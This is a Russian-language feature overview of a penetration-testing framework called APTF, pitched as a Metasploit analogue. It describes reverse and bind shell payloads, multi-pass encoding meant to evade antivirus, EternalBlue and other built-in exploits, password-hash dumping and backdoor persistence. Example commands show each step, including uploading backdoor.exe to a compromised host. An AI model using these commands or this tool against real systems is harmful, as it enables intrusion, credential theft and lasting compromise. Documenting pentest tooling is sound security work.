Функционал/описание:
Этот фреймворк (APTF) представляет собой аналог Metasploit, но с упором на гибкость, модульность и расширенную генерацию payload-ов. Он предназначен для тестирования на проникновение (Pentesting), эксплуатации уязвимостей и пост-эксплуатации.
 Основные функции и назначение
1. Генерация вредоносных payload-ов
Поддержка разных языков (Python, Bash, PowerShell, PHP, Perl, Java).

Reverse Shell (обратное подключение к атакующему).

Bind Shell (открытие порта на жертве для подключения).

Кодирование payload-ов (Base64, Hex, ROT13, XOR, Gzip).

Многопроходное шифрование для обхода антивирусов.

Пример:

bash
generate reverse 192.168.1.100 4444 python base64 3
*(Создаст Python reverse-shell, закодированный в Base64 трижды)*

2. Эксплуатация уязвимостей
Встроенные эксплойты (например, EternalBlue, Shellshock, Struts2 RCE).

Гибкая настройка параметров (RHOST, RPORT, PAYLOAD).

Проверка уязвимости (check перед атакой).

Пример:

bash
use windows/smb/eternalblue  
set RHOST 192.168.1.50  
set LHOST 192.168.1.100  
run  
3. Слушатели (Listeners) и управление сессиями
Reverse TCP/HTTP-листенеры для приёма подключений.

Шифрование трафика (Fernet).

Многопоточная обработка сессий.

Интерактивный shell (sessions -i <ID>).

Пример:

bash
listen 0.0.0.0 4444  
sessions -i 1a2b3c4d  
4. Пост-эксплуатация
После получения доступа к системе можно:

Загружать/скачивать файлы (upload, download).

Захватывать хэши паролей (hashdump).

Устанавливать бекдоры (persistence).

Делать скриншоты (screenshot).

Пример:

bash
post 1a2b3c4d upload /tmp/backdoor.exe C:\\Windows\\Temp\\  
post 1a2b3c4d shell "whoami /all"  
5. Сканирование сети
Порт-сканер (scan 192.168.1.1 1-1000).

Определение сервисов (HTTP, SMB, SSH и т. д.).

Многопоточное сканирование (ускорение проверки).
